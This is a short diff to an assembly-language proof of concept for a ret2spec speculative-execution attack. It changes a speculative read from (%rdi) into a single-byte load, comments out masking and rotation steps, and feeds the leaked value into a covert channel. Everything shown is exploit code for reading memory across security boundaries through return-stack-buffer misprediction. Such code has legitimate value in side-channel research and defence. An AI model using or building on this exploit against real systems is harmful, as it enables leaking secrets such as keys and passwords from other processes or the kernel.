@@ -29,13 +29,13 @@ ret2spec:
   call rsb_mispredict
   
   // Leak the value at (%rdi)
-  mov (%rdi), %rax
+  movb (%rdi), %al
 
   // Do the mask and subtracting thing to make sure we
   // actually leak the thing
-  andq %r8, %rax
-  subq %r9, %rax
-  ror $48, %rax
+  //andq %r8, %rax
+  //subq %r9, %rax
+  //ror $48, %rax
 
   // Covert channel for the leaked value
   // These two instructions are never actually executed, but are speculatively
